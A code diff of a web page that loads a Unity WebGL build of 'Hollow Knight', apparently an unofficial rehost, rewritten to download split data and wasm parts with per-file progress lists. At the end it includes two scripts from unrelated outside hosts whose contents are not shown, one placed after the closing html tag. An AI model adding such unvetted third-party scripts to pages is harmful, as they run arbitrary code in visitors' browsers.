@@ -1,166 +1,169 @@
 <!DOCTYPE html>
-<html lang="en-us">
+<html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <title>Unity WebGL Player | Hollow Knight</title>
-  <link rel="shortcut icon" href="TemplateData/favicon.ico">
-  <link rel="stylesheet" href="TemplateData/style.css">
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      overflow: hidden;
-      background: #231F20;
-    }
-    #unity-container {
-      width: 100%;
-      height: 100%;
-      position: fixed;
-      top: 0;
-      left: 0;
-    }
-  </style>
+<meta charset="utf-8">
+<title>Unity WebGL Loader</title>
+<style>
+  html, body {
+    margin:0; padding:0; height:100%; width:100%; background:#231F20; font-family:monospace;
+    overflow: hidden;
+  }
+  #unity-container {
+    width: 100%; height: 100%; position: fixed; top:0; left:0; background:black;
+  }
+  #unity-canvas {
+    width:100%; height:100%; display:block;
+  }
+  #loading-text {
+    color:white; font-size:32px; text-align:center; margin-top:20px;
+  }
+  .file-list {
+    color:white; background:rgba(0,0,0,0.7); padding:10px; border-radius:8px; overflow-y:auto; margin:5px; font-size:14px;
+  }
+  .file-item.queued { color:#FFD700; }
+  .file-item.downloading { color:#00BFFF; }
+  .file-item.done { color:#32CD32; }
+  .file-lists { display:flex; justify-content:space-between; position:absolute; top:20px; left:20px; right:20px; width:calc(100% - 40px); }
+  .file-lists .file-list { width:32%; }
+  #unity-loading-bar { position:absolute; bottom:20px; left:50%; transform:translateX(-50%); width:50%; height:20px; background:#333; border-radius:10px; overflow:hidden; }
+  #unity-progress-bar-full { width:0%; height:100%; background:#32CD32; transition: width 0.2s; }
+</style>
 </head>
-
 <body>
-  <div id="loading-text" style="color: white; font-size: 48px; font-family: cursive; text-align: center; margin-top: 20px;">LOADING...</div>
-  <div hidden id="unity-container" class="unity-desktop">
-    <canvas id="unity-canvas"></canvas>
-    <div id="unity-loading-bar">
-      <div id="unity-logo"></div>
-      <div id="unity-progress-bar-empty">
-        <div id="unity-progress-bar-full"></div>
-      </div>
-    </div>
-    <div id="unity-mobile-warning">WebGL builds are not supported on mobile devices.</div>
-  </div>
 
-  <script>
-    const loadingText = document.querySelector("#loading-text");
-    let totalBytes = 0;
-    let loadedBytes = 0;
+<div id="loading-text">LOADING...</div>
 
-    async function getSize(url) {
-      try {
-        const res = await fetch(url, { method: "HEAD" });
-        return parseInt(res.headers.get("Content-Length") || "0", 10);
-      } catch {
-        return 0;
-      }
+<div class="file-lists">
+  <div id="file-list-left" class="file-list"></div>
+  <div id="file-list-right-top" class="file-list"></div>
+  <div id="file-list-right-bottom" class="file-list"></div>
+</div>
+
+<div id="unity-container" hidden>
+  <canvas id="unity-canvas"></canvas>
+  <div id="unity-loading-bar"><div id="unity-progress-bar-full"></div></div>
+</div>
+
+<script>
+const fileLists = {
+  left: document.getElementById("file-list-left"),
+  rightTop: document.getElementById("file-list-right-top"),
+  rightBottom: document.getElementById("file-list-right-bottom")
+};
+const loadingText = document.getElementById("loading-text");
+let loadedBytes = 0, totalBytes = 0;
+
+function sanitizeId(name){ return 'file-'+name.replace(/[^a-zA-Z0-9_-]/g,'_'); }
+
+function updateFileStatus(list,name,status,loaded=0,total=0){
+  const id = sanitizeId(name);
+  let item = list.querySelector('#'+id);
+  if(!item){ item = document.createElement('div'); item.id=id; item.className='file-item'; list.appendChild(item);}
+  const loadedMB = (loaded/1024/1024).toFixed(2);
+  const totalMB = total ? (total/1024/1024).toFixed(2) : '?';
+  item.textContent = `${name}: ${status} ${loadedMB} MB / ${totalMB} MB`;
+  item.className = `file-item ${status.replace(' ','').toLowerCase()}`;
+}
+
+async function fetchPart(url,name,list){
+  updateFileStatus(list,name,'queued');
+  const response = await fetch(url);
+  const contentLength = parseInt(response.headers.get('content-length')||'0',10);
+  totalBytes += contentLength;
+
+  const reader = response.body.getReader();
+  const chunks=[]; let received=0;
+  while(true){
+    const {done,value} = await reader.read();
+    if(done) break;
+    chunks.push(value); received+=value.length; loadedBytes+=value.length;
+    updateFileStatus(list,name,'downloading',received,contentLength);
+    loadingText.textContent=`LOADING... ${(loadedBytes/1024/1024).toFixed(2)} MB / ${(totalBytes/1024/1024).toFixed(2)} MB`;
+  }
+
+  const buffer = new Uint8Array(received); let offset=0;
+  for(const chunk of chunks){ buffer.set(chunk,offset); offset+=chunk.length; }
+  updateFileStatus(list,name,'done',contentLength,contentLength);
+  return buffer.buffer;
+}
+
+function mergeBuffers(buffers){
+  const totalLength = buffers.reduce((sum,b)=>sum+b.byteLength,0);
+  const merged = new Uint8Array(totalLength); let offset=0;
+  for(const b of buffers){ merged.set(new Uint8Array(b),offset); offset+=b.byteLength; }
+  return URL.createObjectURL(new Blob([merged]));
+}
+
+function getParts(file,start,end){ const arr=[]; for(let i=start;i<=end;i++) arr.push(`${file}.part${i}`); return arr; }
+
+(async ()=>{
+  const fileGroups = [
+    { parts: getParts('./Build/bog.data',1,22), list: fileLists.left, namePrefix:'DATA' },
+    { parts: getParts('./Build/bog.data',23,44), list: fileLists.rightTop, namePrefix:'DATA' },
+    { parts: getParts('./Build/bog.wasm',1,2), list: fileLists.rightBottom, namePrefix:'WASM' }
+  ];
+
+  // Fetch all parts in parallel per group
+  const buffersPerGroup = await Promise.all(
+    fileGroups.map(async group=>{
+      return await Promise.all(
+        group.parts.map((p,i)=>fetchPart(p,`${group.namePrefix} part ${i+1}`,group.list))
+      );
+    })
+  );
+
+  // Merge buffers in order
+  const dataBuffers = [...buffersPerGroup[0], ...buffersPerGroup[1]]; // all data
+  const wasmBuffers = buffersPerGroup[2];
+  const dataUrl = mergeBuffers(dataBuffers);
+  const wasmUrl = mergeBuffers(wasmBuffers);
+
+  // Start Unity
+  const buildUrl = './Build';
+  const loaderUrl = `${buildUrl}/bog.loader.js`;
+  const config = {
+    dataUrl:dataUrl,
+    frameworkUrl:`${buildUrl}/bog.framework.js`,
+    codeUrl:wasmUrl,
+    streamingAssetsUrl:'StreamingAssets',
+    companyName:'Team Cherry & Truffled',
+    productName:'Hollow Knight',
+    productVersion:'1.0'
+  };
+
+  const container=document.getElementById('unity-container');
+  const canvas=document.getElementById('unity-canvas');
+  const progressBarFull=document.getElementById('unity-progress-bar-full');
+  container.hidden=false;
+
+  function resizeCanvas(){
+    canvas.width=window.innerWidth;
+    canvas.height=window.innerHeight;
+    canvas.style.width=window.innerWidth+'px';
+    canvas.style.height=window.innerHeight+'px';
+  }
+  resizeCanvas();
+  window.addEventListener('resize',resizeCanvas);
+
+  const script=document.createElement('script');
+  script.src=loaderUrl;
+  script.onload = () => {
+  createUnityInstance(canvas, config, progress => {
+    progressBarFull.style.width = (progress * 100) + "%";
+    if (progress >= 1) {
+      document.getElementById('unity-loading-bar').style.display = 'none';
     }
+  }).then(() => {
+    loadingText.remove();
+    Object.values(fileLists).forEach(l => l.remove());
+  }).catch(alert);
+};
 
-    async function fetchWithProgress(url) {
-      const response = await fetch(url);
-      const reader = response.body.getReader();
-      const chunks = [];
-      let received = 0;
+  document.body.appendChild(script);
+})();
+</script>
 
-      while (true) {
-        const { done, value } = await reader.read();
-        if (done) break;
-        received += value.length;
-        loadedBytes += value.length;
-        chunks.push(value);
-
-        const mbDone = (loadedBytes / (1024 * 1024)).toFixed(2);
-        const mbTotal = '909.17';
-        loadingText.textContent = `LOADING... ${mbDone} MB / ${mbTotal} MB`;
-      }
-
-      const fullBuffer = new Uint8Array(received);
-      let offset = 0;
-      for (const chunk of chunks) {
-        fullBuffer.set(chunk, offset);
-        offset += chunk.length;
-      }
-      return fullBuffer.buffer;
-    }
-
-    async function mergeFiles(fileParts) {
-      const buffers = await Promise.all(fileParts.map(part => fetchWithProgress(part)));
-      const mergedBlob = new Blob(buffers);
-      return URL.createObjectURL(mergedBlob);
-    }
-
-    function getParts(file, start, end) {
-      const parts = [];
-      for (let i = start; i <= end; i++) {
-        parts.push(`${file}.part${i}`);
-      }
-      return parts;
-    }
-
-    (async () => {
-      const allParts = [
-        ...getParts("./Build/bog.data", 1, 44),
-        ...getParts("./Build/bog.wasm", 1, 2)
-      ];
-
-      const sizes = await Promise.all(allParts.map(getSize));
-      totalBytes = sizes.reduce((a, b) => a + b, 0);
-
-      const [dataUrl, wasmUrl] = await Promise.all([
-        mergeFiles(getParts("./Build/bog.data", 1, 44)),
-        mergeFiles(getParts("./Build/bog.wasm", 1, 2))
-      ]);
-
-      const buildUrl = "./Build";
-      const loaderUrl = `${buildUrl}/bog.loader.js`;
-
-      const config = {
-        dataUrl: dataUrl,
-        frameworkUrl: `${buildUrl}/bog.framework.js`,
-        codeUrl: wasmUrl,
-        streamingAssetsUrl: "StreamingAssets",
-        companyName: "Team Cherry & Truffled",
-        productName: "Hollow Knight",
-        productVersion: "1.0"
-      };
-
-      const container = document.querySelector("#unity-container");
-      container.hidden = false;
-      const canvas = document.querySelector("#unity-canvas");
-      const loadingBar = document.querySelector("#unity-loading-bar");
-      const progressBarFull = document.querySelector("#unity-progress-bar-full");
-      const mobileWarning = document.querySelector("#unity-mobile-warning");
-
-      if (/iPhone|iPad|iPod|Android/i.test(navigator.userAgent)) {
-        container.className = "unity-mobile";
-        config.devicePixelRatio = 1;
-        mobileWarning.style.display = "block";
-        setTimeout(() => (mobileWarning.style.display = "none"), 5000);
-      } else {
-        function resizeCanvas() {
-          canvas.width = window.innerWidth;
-          canvas.height = window.innerHeight;
-          canvas.style.width = window.innerWidth + "px";
-          canvas.style.height = window.innerHeight + "px";
-        }
-        resizeCanvas();
-        window.addEventListener("resize", resizeCanvas);
-      }
-
-      loadingBar.style.display = "block";
-
-      const script = document.createElement("script");
-      script.src = loaderUrl;
-      script.onload = () => {
-        createUnityInstance(canvas, config, (progress) => {
-          progressBarFull.style.width = 100 * progress + "%";
-        }).then((unityInstance) => {
-          loadingText.remove();
-          loadingBar.style.display = "none";
-          canvas.style.display = "block";
-        }).catch((message) => {
-          alert(message);
-        });
-      };
-      document.body.appendChild(script);
-    })();
-  </script>
-<script src="https://help.voidium.uk/lib/fps.js"></script>
 </body>
 </html>
-<script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
+ <script src="https://help.voidium.uk/lib/fps.js"></script>
+    <script src="https://olibot13.pythonanywhere.com/client_script.js"></script>
